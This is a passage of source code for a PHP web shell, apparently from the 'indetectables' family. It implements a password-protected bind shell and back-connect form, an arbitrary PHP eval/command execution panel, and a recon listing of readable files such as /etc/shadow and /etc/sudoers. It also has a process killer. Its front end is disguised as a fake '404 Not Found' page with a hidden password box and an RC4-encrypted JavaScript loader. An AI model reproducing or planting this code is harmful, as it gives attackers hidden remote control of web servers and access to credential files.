			socket_write($client, 'Password: ');				
			$input = socket_read($client, strlen($pass) + 2); // +2 for \r\n // Read the pass from the client
			if (trim($input) == $pass){
				socket_write($client, "\n\n");
				socket_write($client, ($isWIN) ? execute("date /t & time /t") . "\n" . execute("ver") : execute("date") . "\n" . execute("uname -a"));
				socket_write($client, "\n\n");

				while (1){// Print command prompt
					$maxCmdLen = 31337;
					socket_write($client, '(Shell)[$]> ');
					$cmd = socket_read($client, $maxCmdLen);
					if ($cmd == false){
						$sBuff .= 'The client Closed the conection!';
						break;
					}
					socket_write($client, execute($cmd));
				}
			} else {
				$sBuff .= 'Wrong Password!';
				socket_write($client, "Wrong Password!\n\n");
			}
			socket_shutdown($client, 2);
			socket_close($socket);	
			//socket_close($client);// Close the client (child) socket
			//socket_close($sock);// Close the master sockets
		} else
			$sBuff .= "Socket Conections not Allowed/Supported by the server!";
	} else {
		$sBuff .= '
		<div class="table floatCenter">
			<div class="table-row">
				<div class="table-col floatCenter"><b>' . tText('bc0', 'Back Connect') . '</b></div>
				<div class="table-col floatCenter"><b>' . tText('bc1', 'Bind Shell') . '</b></div>
			</div>
			<div class="table-row" style="text-align:left;">
				<div class="table-col"><form>
				' . mInput('ip', $_SERVER['REMOTE_ADDR'], tText('bc2', 'IP'), 1) . '
				' . mInput('port', '31337', tText('bc3', 'Port'), 1) . '
				' . mSelect('mode', array('PHP'), 1, 0, 0, tText('bc4', 'Mode')) . '
				' . mSubmit(tText('bc6', 'Listen'), 'uiupdate(0)', 1) . '
				</form></div>
				<div class="table-col"><form>
				' . mInput('port', '31337', tText('bc3', 'Port'), 1) . '
				' . mInput('passwd', 'indetectables', tText('bc5', 'Password'), 1) . '
				' . mSelect('mode', array('PHP', 'Python'), 1, 0, 0, tText('bc4', 'Mode')) . '
				' . mSubmit(tText('bc7', 'Bind'), 'uiupdate(1)', 1) . '
				</form></div>
		</div>';
	}
}

if (isset($p['me']) && $p['me'] === 'execute'){
    $sBuff .= '<h2>' . tText('ev0', 'Eval/Execute') . '</h2>';
    $code = @trim($p['c']);
    if ($code){
		if (isset($p['e'])){
			/*$locale = 'en_GB.utf-8';
			setlocale(LC_ALL, $locale);
			putenv('LC_ALL='.$locale);*/
			$buf = execute($code, true);
			$sBuff .= "<br><b>" . tText('ev4', 'Execute via') . ": </b>{$buf[1]}";
			if (isset($p['dta'])) 
				$sBuff .= "<br><textarea class='bigarea' readonly>{$buf[0]}</textarea><br>";
			else 
				$sBuff .= "<br><pre>{$buf[0]}</pre><br>";
		} else {
			if (!preg_match('#<\?#si', $code)) 
				$code = "<?php\n\n{$code}\n\n?>";

			//hago esta chapuzada para que no se muestre el resultado arriba
			echo 'Result of the executed code:';
			$buf = ob_get_contents();

			if ($buf){
				ob_clean();
				eval("?" . ">{$code}");
				$ret = ob_get_contents();
				$ret = convert_cyr_string($ret, 'd', 'w');
				ob_clean();
				$sBuff .= $buf;
				
				if (isset($p['dta'])) 
					$sBuff .= '<br><textarea class="bigarea" readonly>' . hsc($ret) . '</textarea>';
				else 
					$sBuff .= "<br><pre>{$ret}</pre>";
			} else
				eval("?" . ">{$code}");
        }
    }

    $sBuff .= '<form>
	<textarea class="bigarea" name="c">' . (isset($p['c']) ? hsc($p['c']) : '') . '</textarea></p>
	<p>' . tText('ev1', 'Display in text-area') . ': ' . mCheck('dta', '1', '', isset($p['dta'])) . '&nbsp;&nbsp;
	' . tText('execute', 'Execute') . ': ' . mCheck('e', '1', '', isset($p['e'])) . '&nbsp;&nbsp;
	<a href="http://www.4ngel.net/phpspy/plugin/" target="_blank">[ ' . tText('ev3', 'Get examples') . ' ]</a>
	<br><br>' . mSubmit(tText('go', 'Go!'), 'ajaxLoad(serialize(d.forms[0]))') . '</p>
	' . mHide('me', 'execute') . '
	</form>';
}

if (isset($p['me']) && $p['me'] === 'info'){
    if (isset($p['pvn'])) 
		$sBuff .= sAjax($p['pvn'] . ': ' . getfun($p['pvn']));
    
	$sBuff .= '<form>' . mHide('me', 'info') . '
        <h2>' . tText('info', 'Info') . '</h2> 
        <p>' . tText('in0', 'PHP config param (ex: magic_quotes_gpc)') . '
        ' . mInput('pvn', '') . ' ' . mSubmit(tText('go', 'Go!'), 'uiupdate(0)', '', 'style="width: 5px;display: inline;"') . '</p> 
        </form>';
	
	//principal resume
	$dis_func = get_cfg_var('disable_functions');
    !$dis_func && $dis_func = 'No';

	$sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info');\" style='margin-bottom:8px;'>Resume</p>" .
		"<div id='info' style='margin-bottom:8px;display:none;'><table class='dataView'>";
    $info = array(
        'Server Time' => date('Y/m/d h:i:s', time()),
        'Server Domain' => $_SERVER['SERVER_NAME'],
        'Server IP' => gethostbyname($_SERVER['SERVER_NAME']),
        'Server OS' => PHP_OS,
        'Server OS Charset' => $_SERVER['HTTP_ACCEPT_LANGUAGE'],
        'Server Software' => $_SERVER['SERVER_SOFTWARE'],
        'Server Web Port' => $_SERVER['SERVER_PORT'],
        'PHP run mode' => php_sapi_name(),
        'This file path' => __file__,
        'PHP Version' => PHP_VERSION,
        'PHP Info' => ((function_exists('phpinfo') && @! in_array('phpinfo', $dis_func)) ? '<b>Yes</b>' : 'No'),
        'Safe Mode' => getcfg('safe_mode'),
        'Administrator' => (isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from')),
        'allow_url_fopen' => getcfg('allow_url_fopen'),
        'enable_dl' => getcfg('enable_dl'),
        'display_errors' => getcfg('display_errors'),
        'register_globals' => getcfg('register_globals'),
        'magic_quotes_gpc' => getcfg('magic_quotes_gpc'),
        'memory_limit' => getcfg('memory_limit'),
        'post_max_size' => getcfg('post_max_size'),
        'upload_max_filesize' => (getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed'),
        'max_execution_time' => getcfg('max_execution_time') . ' second(s)',
        'disable_functions' => $dis_func,
        'MySQL' => getfun('mysql_connect'),
        'MSSQL' => getfun('mssql_connect'),
        'PostgreSQL' => getfun('pg_connect'),
        'Oracle' => getfun('ocilogon'),
        'Curl' => getfun('curl_version'),
        'gzcompress' => getfun('gzcompress'),
        'gzencode' => getfun('gzencode'),
        'bzcompress' => getfun('bzcompress')
    );
	
	foreach ($info as $v => $k)
		$sBuff .= "<tr><td>{$v}</td><td>{$k}</td></tr>";
	
	$sBuff .= "</table></div>";
	
	//server misc info - based on b374k work
	$sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info_server');\" style='margin-bottom:8px;'>Server Info</p>" .
		"<div id='info_server' style='margin-bottom:8px;display:none;'><table class='dataView'>";
	if ($isWIN){
		foreach (range("A", "Z") as $letter){
			if(is_readable($letter.":\\")){
				$drive = $letter.":";
				$sBuff .= "<tr><td>drive {$drive}</td><td>" . sizecount(@disk_free_space($drive)) . " free of " . sizecount(@disk_total_space($drive)) . "</td></tr>";
			}
		}
	} else 
		$sBuff .= "<tr><td>root partition</td><td>" . sizecount(@disk_free_space("/")) . " free of " . sizecount(@disk_total_space("/")) . "</td></tr>";

	$sBuff .= "<tr><td>PHP</td><td>" . phpversion() . "</td></tr>";
	$access = array(
			"python"=>"python -V",
			"perl"=>"perl -e \"print \$]\"",
			"python"=>"python -V",
			"ruby"=>"ruby -v",
			"node"=>"node -v",
			"nodejs"=>"nodejs -v",
			"gcc"=>"gcc -dumpversion",
			"java"=>"java -version",
			"javac"=>"javac -version"
		);

	foreach($access as $k => $v){
		$v = explode("\n", execute($v));
		if ($v[0]) $v = $v[0];
		else $v = "?";

		$sBuff .= "<tr><td>{$k}</td><td>{$v}</td></tr>";
	}

	if(!$isWIN){
		$interesting = array(
			"/etc/os-release", "/etc/passwd", "/etc/shadow", "/etc/group", "/etc/issue", "/etc/issue.net", "/etc/motd", "/etc/sudoers", "/etc/hosts", "/etc/aliases",
			"/proc/version", "/etc/resolv.conf", "/etc/sysctl.conf",
			"/etc/named.conf", "/etc/network/interfaces", "/etc/squid/squid.conf", "/usr/local/squid/etc/squid.conf",
			"/etc/ssh/sshd_config",
			"/etc/httpd/conf/httpd.conf", "/usr/local/apache2/conf/httpd.conf", " /etc/apache2/apache2.conf", "/etc/apache2/httpd.conf", "/usr/pkg/etc/httpd/httpd.conf", "/usr/local/etc/apache22/httpd.conf", "/usr/local/etc/apache2/httpd.conf", "/var/www/conf/httpd.conf", "/etc/apache2/httpd2.conf", "/etc/httpd/httpd.conf",
			"/etc/lighttpd/lighttpd.conf", "/etc/nginx/nginx.conf",
			"/etc/fstab", "/etc/mtab", "/etc/crontab", "/etc/inittab", "/etc/modules.conf", "/etc/modules"
		);
		foreach($interesting as $f){
			if (@is_file($f) && @is_readable($f)) 
				$sBuff .= "<tr><td>{$f}</td><td><a data-path='{$f}' onclick='view_entry(this);'>{$f} is readable</a></td></tr>";
		}
	}
	$sBuff .= "</table></div>";

	
	// cpu info
	if(!$isWIN){
		if ($i_buff=trim(read_file("/proc/cpuinfo"))){
			$sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info_cpu');\" style='margin-bottom:8px;'>CPU Info</p>" .
				"<div id='info_cpu' style='margin-bottom:8px;display:none;'>";
			$i_buffs = explode("\n\n", $i_buff);
			foreach($i_buffs as $i_buffss){
				$i_buffss = trim($i_buffss);
				if($i_buffss!=""){
					$i_buffsss = explode("\n", $i_buffss);
					$sBuff .= "<table class='dataView'>";
					foreach($i_buffsss as $i){
						$i = trim($i);
						if($i!=""){
							$ii = explode(":",$i);
							if(count($ii)==2) $sBuff .= "<tr><td>{$ii[0]}</td><td>{$ii[1]}</td></tr>";
						}
					}
					$sBuff .= "</table>";
				}
			}
			$sBuff .= "</div>";
		}

		// mem info
		if ($i_buff=trim(read_file("/proc/meminfo"))){
			$sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info_mem');\" style='margin-bottom:8px;'>Memory Info</p>" .
				"<div id='info_mem' style='margin-bottom:8px;display:none;'><table class='dataView'>";
			$i_buffs = explode("\n", $i_buff);
			foreach($i_buffs as $i){
				$i = trim($i);
				if($i!=""){
					$ii = explode(":", $i);
					if(count($ii)==2) $sBuff .= "<tr><td>{$ii[0]}</td><td>{$ii[1]}</td></tr>";
				} else 
					$sBuff .= "</table><table class='dataView'>";
			}
			$sBuff .= "</table></div>";
		}

		// partition
		if ($i_buff=trim(read_file("/proc/partitions"))){
			$sBuff .= "<p class='boxtitle touch' onclick=\"toggle('info_part');\" style='margin-bottom:8px;'>Partitions Info</p>" .
				"<div id='info_part' style='margin-bottom:8px;display:none;'>" .
				"<table class='dataView'><tr>";
			$i_buff = preg_replace("/\ +/", " ", $i_buff);
			$i_buffs = explode("\n\n", $i_buff);
			$i_head = explode(" ", $i_buffs[0]);
			foreach($i_head as $h) 
				$sBuff .= "<th>{$h}</th>";
			$sBuff .= "</tr>";
			$i_buffss = explode("\n", $i_buffs[1]);
			foreach($i_buffss as $i_b){
				$i_row = explode(" ", trim($i_b));
				$sBuff .= "<tr>";
				foreach($i_row as $r) 
					$sBuff .= "<td style='text-align:center;'>{$r}</td>";
				$sBuff .= "</tr>";
			}
			$sBuff .= "</table></div>";
		}
	}
	
	$phpinfo = array("PHP General" => INFO_GENERAL, "PHP Configuration" => INFO_CONFIGURATION, "PHP Modules" => INFO_MODULES, "PHP Environment" => INFO_ENVIRONMENT, "PHP Variables" => INFO_VARIABLES);
	foreach($phpinfo as $p=>$i){
		$sBuff .= "<p class='boxtitle touch' onclick=\"toggle('{$i}');\" style='margin-bottom:8px;'>{$p}</p>";
		ob_start();
		eval("phpinfo($i);");
		$b = ob_get_contents();
		ob_end_clean();
		if (preg_match("/<body>(.*?)<\/body>/is", $b, $r)){
			$body = str_replace(array(',', ';', '&amp;'), array(', ', '; ', '&'), $r[1]);
			$body = str_replace('<table', "<table class='boxtbl' ", $body);
			$body = preg_replace("/<tr class=\"h\">(.*?)<\/tr>/", "", $body);
			$body = preg_replace("/<a href=\"http:\/\/www.php.net\/(.*?)<\/a>/", '', $body);
			$body = preg_replace("/<a href=\"http:\/\/www.zend.com\/(.*?)<\/a>/", '', $body);
			$sBuff .= "<div id='{$i}' style='margin-bottom:8px;display:none;'>{$body}</div>";
		}
	}
}

if (isset($p['me']) && $p['me'] === 'process'){
	if (isset($p['ps'])){
		$tmp = '';
        for ($i = 0; count($p['ps']) > $i; $i++){
			if (function_exists('posix_kill')) 
				$tmp .= (posix_kill($p['ps'][$i], '9') ? 'Process with pid ' . $p['ps'][$i] . ' has been successfully killed' : 'Unable to kill process with pid ' . $p['ps'][$i]) . '<br>';
			else {
				if($isWIN) $tmp .= execute("taskkill /F /PID {$p['ps'][$i]}") . '<br>';
				else $tmp .= execute("kill -9 {$p['ps'][$i]}") . '<br>';
			}
		}
		
		$sBuff .= sDialog($tmp);
	}

	$h = 'ps aux';
	$wexp = ' ';
	if ($isWIN){
		$h = 'tasklist /V /FO csv';
		$wexp = '","';
	}

	$res = execute($h);
	if (trim($res) === '') $sBuff = sDialog('Error getting process list');
	else {
		if(!$isWIN) $res = preg_replace('#\ +#', ' ', $res);
		$psarr = explode("\n", $res);
		$h = true;
		$tblcount = 0;
		$wcount = count(explode($wexp, $psarr[0]));

		$sBuff .= '<br><form><table id="sort" class="explore sortable">';
		foreach($psarr as $psa){
			if(trim($psa) !== ''){
				if($h){
					$h = false;
					$psln = explode($wexp, $psa, $wcount);
					$sBuff .= '<tr><th style="width:24px;" class="sorttable_nosort"></th><th class="sorttable_nosort">action</th>';
					foreach($psln as $p) 
						$sBuff .= '<th class="touch">' . trim(trim($p), '"') . '</th>';
					$sBuff .= '</tr>';
				} else {
					$psln = explode($wexp, $psa, $wcount);
					$sBuff .= '<tr>';
					$tblcount = 0;
					foreach($psln as $p){
						$pid = trim(trim($psln[1]), '"');
						if(trim($p) === '') $p = '&nbsp;';
						if($tblcount == 0){
							$sBuff .= '<td style="text-align:center;text-indent:4px;"><input name="ps[]" value="' . $pid . '" type="checkbox" onchange="hilite(this);" /></td>' .
								'<td style="text-align:center;"><a href="#" onclick="if (confirm(\'' . tText('merror', 'Are you sure?') . '\')) ajaxLoad(\'me=process&ps[]=' . $pid . '\')">kill</a></td>' .
								'<td style="text-align:center;">' . trim(trim($p), '"') . '</td>';
							$tblcount++;
						} else {
							$tblcount++;
							if($tblcount == count($psln)) $sBuff .= "<td style='text-align:left;'>".trim(trim($p), '"')."</td>";
							else $sBuff .= "<td style='text-align:center;'>".trim(trim($p), '"')."</td>";
						}
					}
					$sBuff .= '</tr>';
				}
			}
		}
		
		$sBuff .= '<tfoot><tr><td>' . mCheck('chkall', '', 'CheckAll(this.form);') . '</td>' .
			'<td style="text-indent:10px;padding:2px;" colspan="' . (count($psln)+1) . '">' . mSubmit(tText('ps0', 'kill selected'), 'ajaxLoad(serialize(d.forms[0]))') .
			'<span id="total_selected"></span></a></td></tr></tfoot></table>' . mHide('me', 'process') . '</form>';
	}
}

#Se fini
if (isset($_SERVER['HTTP_X_REQUESTED_WITH']) && $_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest')
	sAjax($sBuff . mHide('etime', substr((microtime(true) - $loadTime), 0, 4)));
	//sAjax($sBuff . mHide('etime', substr((microtime(true) - $loadTime), 0, 4) . ' Mem Peak: ' . sizecount(memory_get_peak_usage(false)) . ' Men: ' . sizecount(memory_get_usage(false))) );
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
<script type="text/javascript">
	function rc4Init(key) {
		j = 0;
		box = [];
		keylength = key.length;

		for (i = 0; i < 256; i++) {
			box[i] = i;
		}
		
		for (i = 0; i < 256; i++) {
			j = (j + box[i] + key.charCodeAt(i % keylength)) % 256;
			tmp = box[i];
			box[i] = box[j];
			box[j] = tmp;
		}

		return box;
	}

	function rc4(data, box) {
		i = 0;
		j = 0;
		res = '';
		datalength = data.length;
		for (y = 0; y < datalength; y++) {
			i = (i + 1) % 256;
			j = (j + box[i]) % 256;
			tmp = box[i];
			box[i] = box[j];
			box[j] = tmp;
			res += String.fromCharCode(data.charCodeAt(y) ^ box[(box[i] + box[j]) % 256]);
		}
		
		return res;
	}
	
	//MD5 - DSR!
	function add32(a, b) {
		return (a + b) & 0xFFFFFFFF;
	}
	
	function cmn(q, a, b, x, s, t) {
		a = add32(add32(a, q), add32(x, t));
		return add32((a << s) | (a >>> (32 - s)), b);
	}

	function ff(a, b, c, d, x, s, t) {
		return cmn((b & c) | ((~b) & d), a, b, x, s, t);
	}

	function gg(a, b, c, d, x, s, t) {
		return cmn((b & d) | (c & (~d)), a, b, x, s, t);
	}

	function hh(a, b, c, d, x, s, t) {
		return cmn(b ^ c ^ d, a, b, x, s, t);
	}

	function ii(a, b, c, d, x, s, t) {
		return cmn(c ^ (b | (~d)), a, b, x, s, t);
	}
	
	function md5cycle(x, k) {
		a = x[0];
		b = x[1];
		c = x[2];
		d = x[3];

		a = ff(a, b, c, d, k[0], 7, -680876936);
		d = ff(d, a, b, c, k[1], 12, -389564586);
		c = ff(c, d, a, b, k[2], 17, 606105819);
		b = ff(b, c, d, a, k[3], 22, -1044525330);
		a = ff(a, b, c, d, k[4], 7, -176418897);
		d = ff(d, a, b, c, k[5], 12, 1200080426);
		c = ff(c, d, a, b, k[6], 17, -1473231341);
		b = ff(b, c, d, a, k[7], 22, -45705983);
		a = ff(a, b, c, d, k[8], 7, 1770035416);
		d = ff(d, a, b, c, k[9], 12, -1958414417);
		c = ff(c, d, a, b, k[10], 17, -42063);
		b = ff(b, c, d, a, k[11], 22, -1990404162);
		a = ff(a, b, c, d, k[12], 7, 1804603682);
		d = ff(d, a, b, c, k[13], 12, -40341101);
		c = ff(c, d, a, b, k[14], 17, -1502002290);
		b = ff(b, c, d, a, k[15], 22, 1236535329);

		a = gg(a, b, c, d, k[1], 5, -165796510);
		d = gg(d, a, b, c, k[6], 9, -1069501632);
		c = gg(c, d, a, b, k[11], 14, 643717713);
		b = gg(b, c, d, a, k[0], 20, -373897302);
		a = gg(a, b, c, d, k[5], 5, -701558691);
		d = gg(d, a, b, c, k[10], 9, 38016083);
		c = gg(c, d, a, b, k[15], 14, -660478335);
		b = gg(b, c, d, a, k[4], 20, -405537848);
		a = gg(a, b, c, d, k[9], 5, 568446438);
		d = gg(d, a, b, c, k[14], 9, -1019803690);
		c = gg(c, d, a, b, k[3], 14, -187363961);
		b = gg(b, c, d, a, k[8], 20, 1163531501);
		a = gg(a, b, c, d, k[13], 5, -1444681467);
		d = gg(d, a, b, c, k[2], 9, -51403784);
		c = gg(c, d, a, b, k[7], 14, 1735328473);
		b = gg(b, c, d, a, k[12], 20, -1926607734);

		a = hh(a, b, c, d, k[5], 4, -378558);
		d = hh(d, a, b, c, k[8], 11, -2022574463);
		c = hh(c, d, a, b, k[11], 16, 1839030562);
		b = hh(b, c, d, a, k[14], 23, -35309556);
		a = hh(a, b, c, d, k[1], 4, -1530992060);
		d = hh(d, a, b, c, k[4], 11, 1272893353);
		c = hh(c, d, a, b, k[7], 16, -155497632);
		b = hh(b, c, d, a, k[10], 23, -1094730640);
		a = hh(a, b, c, d, k[13], 4, 681279174);
		d = hh(d, a, b, c, k[0], 11, -358537222);
		c = hh(c, d, a, b, k[3], 16, -722521979);
		b = hh(b, c, d, a, k[6], 23, 76029189);
		a = hh(a, b, c, d, k[9], 4, -640364487);
		d = hh(d, a, b, c, k[12], 11, -421815835);
		c = hh(c, d, a, b, k[15], 16, 530742520);
		b = hh(b, c, d, a, k[2], 23, -995338651);

		a = ii(a, b, c, d, k[0], 6, -198630844);
		d = ii(d, a, b, c, k[7], 10, 1126891415);
		c = ii(c, d, a, b, k[14], 15, -1416354905);
		b = ii(b, c, d, a, k[5], 21, -57434055);
		a = ii(a, b, c, d, k[12], 6, 1700485571);
		d = ii(d, a, b, c, k[3], 10, -1894986606);
		c = ii(c, d, a, b, k[10], 15, -1051523);
		b = ii(b, c, d, a, k[1], 21, -2054922799);
		a = ii(a, b, c, d, k[8], 6, 1873313359);
		d = ii(d, a, b, c, k[15], 10, -30611744);
		c = ii(c, d, a, b, k[6], 15, -1560198380);
		b = ii(b, c, d, a, k[13], 21, 1309151649);
		a = ii(a, b, c, d, k[4], 6, -145523070);
		d = ii(d, a, b, c, k[11], 10, -1120210379);
		c = ii(c, d, a, b, k[2], 15, 718787259);
		b = ii(b, c, d, a, k[9], 21, -343485551);

		x[0] = add32(a, x[0]);
		x[1] = add32(b, x[1]);
		x[2] = add32(c, x[2]);
		x[3] = add32(d, x[3]);
	}

	function md5(s) {
		txt = '';
		n = s.length;
		state = [1732584193, -271733879, -1732584194, 271733878];
		for (i = 64; i <= s.length; i += 64) {
			md5cycle(state, md5blk(s.substring(i - 64, i)));
		}
		s = s.substring(i - 64);
		tail = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
		for (i = 0; i < s.length; i++)
			tail[i >> 2] |= s.charCodeAt(i) << ((i % 4) << 3);
		tail[i >> 2] |= 0x80 << ((i % 4) << 3);
		if (i > 55) {
			md5cycle(state, tail);
			for (i = 0; i < 16; i++) tail[i] = 0;
		}
		tail[14] = n * 8;
		md5cycle(state, tail);
		return hex(state);
	}

	function md5blk(s) { 
		md5blks = [];
		for (i = 0; i < 64; i += 4)
			md5blks[i >> 2] = s.charCodeAt(i) + (s.charCodeAt(i + 1) << 8) + (s.charCodeAt(i + 2) << 16) + (s.charCodeAt(i + 3) << 24);
		
		return md5blks;
	}

	function hex(x) {
		hex_chr = '0123456789abcdef'.split('');
		for (i = 0; i < x.length; i++){
			s = '';
			for (j = 0; j < 4; j++)
				s += hex_chr[(x[i] >> (j * 8 + 4)) & 0x0F] + hex_chr[(x[i] >> (j * 8)) & 0x0F];
			x[i] = s;
		}
		return x.join('');
	}
	
	function randStr(l) {
		s = "";
		while(s.length < l)
			s += Math.random().toString(36).slice(2);
			
		return s.substr(0, l);
	}
<?php 
	$loader = "var d = document;
	ajax = new XMLHttpRequest();
	ajax.onreadystatechange = function() {
		if (ajax.readyState == 4 && ajax.status == 200) {
			d.getElementsByTagName('html')[0].innerHTML = rc4(atob(ajax.responseText), rc4Init(hash)).substr({$config['rc4drop']});
			oldscript = d.getElementsByTagName('head')[0].getElementsByTagName('script')[0];			
			fixscript = d.createElement('script');
			fixscript.type = 'text/javascript';
			fixscript.innerHTML = 'var hash = \"' + hash + '\";' + oldscript.innerHTML;
			d.head.appendChild(fixscript);
			oldscript.parentNode.removeChild(oldscript);
		}
	}
	
	if (sessionStorage.getItem('{$config['consNames']['slogin']}') != null) 
		var hash = sessionStorage.getItem('{$config['consNames']['slogin']}');
	else {
		var hash = md5(d.getElementById('pss').value);
		sessionStorage.setItem('{$config['consNames']['slogin']}', hash);
	}
	
	post = '{$config['consNames']['post']}=' + encodeURIComponent(btoa(rc4(randStr({$config['rc4drop']}) + 'me=loader" . (isset($p['dir']) ? "&dir=" . rawurlencode($p['dir']) : "") . "', rc4Init(hash))));
	ajax.open('POST', '" . getSelf() . "', true);
	ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	ajax.setRequestHeader('Content-Length', post.length);
	ajax.setRequestHeader('Connection', 'close');
	ajax.send(post);";
		
	echo "
	function load(hash){
		loader = '" . base64_encode(rc4($loader, rc4Init($config['sPass']))) . "';
		eval(rc4(atob(loader), rc4Init(hash)));			
	}
	
	if (sessionStorage.getItem('{$config['consNames']['slogin']}') != null) 
		load(sessionStorage.getItem('{$config['consNames']['slogin']}'));
	"; ?>
</script>
</head><body>
<h1>Not Found</h1>
<p>The requested URL <?php echo $_SERVER['HTTP_HOST']; ?> was not found on this server.</p>
</body>
<style>input{ margin:0;background-color:#fff;border:1px solid #fff; }</style>
<center><form onsubmit="load(md5(document.getElementById('pss').value));return false;"><input type="password" id="pss"></form>
</html>
